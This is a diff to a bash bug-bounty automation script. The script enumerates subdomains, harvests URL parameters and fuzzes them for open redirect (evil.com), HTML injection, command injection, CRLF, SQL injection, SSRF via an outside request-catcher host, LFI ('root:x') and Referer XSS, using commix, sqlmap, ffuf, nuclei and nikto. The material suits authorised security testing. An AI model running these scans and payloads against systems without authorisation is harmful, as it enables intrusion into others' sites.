@@ -50,13 +50,13 @@ echo "[+]Enumurating SubDomains Using Amass..."
 amass enum -d $target >> $target/recon/subs.txt
 
 echo "[+]Enumurating SubDomains Using Assetfinder..." 
-assetfinder $url >> $target/recon/subs.txt
+assetfinder $target >> $target/recon/subs.txt
 
 echo "[+]Enumurating SubDomains Using SubFinder..."
-subfinder -d $url -o $target/recon/subs.txt
+subfinder -d $target -o $target/recon/subs.txt
 
 echo "[+]Enumurating SubDomains Using Findomain..." 
-findomain -t $url -q >> $target/recon/subs.txt
+findomain -t $target -q >> $target/recon/subs.txt
 
 echo "[+]Enumurating SubDomains Using Sublist3r..."
 python3 /opt/Sublist3r/sublist3r.py -d $target -o $1/recon/subs.txt
@@ -90,7 +90,7 @@ python3 /opt/ParamSpider/paramspider.py --level high -d $target -p khalid -o $1/
 echo "[+]Enumurating Params From Waybackurls...." 
 cat $1/recon/live_subs.txt | waybackurls | grep = | qsreplace khalid | sort -u >> $1/recon/test-params.txt
 echo "[+]Enumurating Params From gau Tool...." 
-gau --subs  $target | | grep = | qsreplace khalid | sort -u >> $1/recon/test-params.txt
+gau --subs  $target  | grep = | qsreplace khalid | sort -u >> $1/recon/test-params.txt
 echo "[+]Enumurating Params From gauPlus Tool...." 
 cat $target/recon/live_subs.txt | gauplus | grep = | qsreplace khalid | sort -u >> $1/recon/test-params.txt
 
@@ -105,13 +105,13 @@ cat $target/recon/final-urls.txt | wc -l
 #-------------------------------Fuzzing For Open Redirects----------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Fuzzing For Openredirects...." 
-cat $target/recon/final-params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ; done >> $target/open-redirects.txt
+cat $target/recon/final-params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ; done >> $target/params-vuln/open-redirects.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For HTMLi Injection---------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Fuzzing For HTML Injection...." 
-cat $target/recon/final-params.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/htmli-test.txt && cat $url/recon/htmli-test.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host" ; done >> $url/htmli.txt
-rm $url/recon/htmli-test.txt
+cat $target/recon/final-params.txt | qsreplace '"><u>hyper</u>' | tee $target/recon/htmli-test.txt && cat $target/recon/htmli-test.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host" ; done >> $url/params-vuln/htmli.txt
+rm $target/recon/htmli-test.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For XSS Injection-----------------------------------------
 #--------------------------------------------------------------------------------------------------
@@ -120,24 +120,24 @@ rm $url/recon/htmli-test.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For Command Injection-----------------------------------------
 #--------------------------------------------------------------------------------------------------
-#echo "[+]Testing For Command Injection...." 
-#python3 /opt/commix/commix.py -m $url/recon/final_params.txt --batch 
+echo "[+]Fuzzing For Command Injection...." 
+python3 /opt/commix/commix.py -m $target/recon/final-params.txt --batch 
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For CRLF Injection-----------------------------------------
 #--------------------------------------------------------------------------------------------------
-'echo "[+]Testing For CRLF Injection...." 
-crlfuzz -l $target/recon/final_params.txt -o $url/crlf_vuln.txt -s 
+echo "[+]Fuzzing For CRLF Injection...." 
+crlfuzz -l $target/recon/final-params.txt -o $target/params-vuln/crlf.txt -s 
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For SQL Injection-----------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Testing For SQL Injection...." 
-cat $target/recon/final_params.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2 
+cat $target/recon/final-params.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2 
 #--------------------------------------------------------------------------------------------------
 #-----------------------------------Checking For SSRF----------------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Fuzzing For External SSRF.........." 
-cat $url/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/eSSRF.txt
-rm $url/recon/ssrftest.txt
+cat $target/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $target/recon/ssrftest.txt && cat $target/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host"; done >> $url/params-vuln/eSSRF.txt
+rm $target/recon/ssrftest.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For XXE Injection----------------------------------------
 #--------------------------------------------------------------------------------------------------
@@ -146,31 +146,37 @@ rm $url/recon/ssrftest.txt
 #-------------------------------Checking For Local File Inclusion----------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Scanning For Local File Inclusion...."
-cat $url/recon/final_params.txt | qsreplace FUZZ | while read host ; do ffuf -u $host -v -mr "root:x" -w payloads/lfi-small.txt ; done > $1/lfi.txt
+cat $target/recon/final-params.txt | qsreplace FUZZ | while read host ; do ffuf -u $host -v -mr "root:x" -w /opt/payloads/lfi-small.txt ; done > $1/params-vuln/lfi.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------Checking For Server Side Template Injection-----------------------------
 #--------------------------------------------------------------------------------------------------
 
 
+
+#--------------------------------------------------------------------------------------------------
+#-------------------------Fuzzing Params With Nuclei ----------------------------------------------
+#--------------------------------------------------------------------------------------------------
+echo "[+]Fuzzing Params With Nuclei Fuzzing Templates..."
+
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Scannning HTTP Parameter Smuggling---------------------------------
 #--------------------------------------------------------------------------------------------------
-figlet "Fuzzing Domains"
+#figlet "Fuzzing Domains"
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For SubDomain TakeOver------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Testing For SubTakeOver" 
-subzy --targets  $url/recon/final_subs.txt  --hide_fails >> $url/sub_take_over.txt
+subzy --targets  $url/recon/final_subs.txt  --hide_fails >> $target/sub_take_over.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------------Full Scan With Nuclei----------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+] Full Scan With Nuclei......." 
-cat $1/recon/live_subs.txt | nuclei -t /root/nuclei-templates/ >> $1/nuclei.txt
+cat $1/recon/live-subs.txt | nuclei -t /root/nuclei-templates/ >> $1/subs-vuln/nuclei.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------------Full Scan With Nikto----------------------------------------
 #--------------------------------------------------------------------------------------------------
-#echo "[+] Full Scan With Nikto...." 
-#nikto -h $url/recon/live_subs.txt > $url/nikto.txt
+echo "[+] Full Scan With Nikto...." 
+nikto -h $target/recon/live-subs.txt > $url/subs-vuln/nikto.txt
 #------------------------------------------------------------------------------------------------------------
 #----------------------------------------------Checking For CORS---------------------------------------------
 #------------------------------------------------------------------------------------------------------------
@@ -179,8 +185,8 @@ cat $1/recon/live_subs.txt | nuclei -t /root/nuclei-templates/ >> $1/nuclei.txt
 #------------------------------------------------------------------------------------------------------------
 #--------------------------------------Checking For XSS through Referer Header-------------------------------
 #------------------------------------------------------------------------------------------------------------
-#echo "[+]Checking For Xss in Referer Header...." | lolcat
-#cat $url/recon/live_subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Referer:https://beebom.com/ | grep "beebom.com" && echo "$host" ; done >> $url/subs_vuln/xss_refer.txt
+echo "[+]Checking For Xss in Referer Header...." | lolcat
+cat $target/recon/live-subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Referer: https://beebom.com/ | grep "beebom.com" && echo "$host" ; done >> $url/subs-vuln/xss-refer.txt
 
 figlet "Recon v2"
 
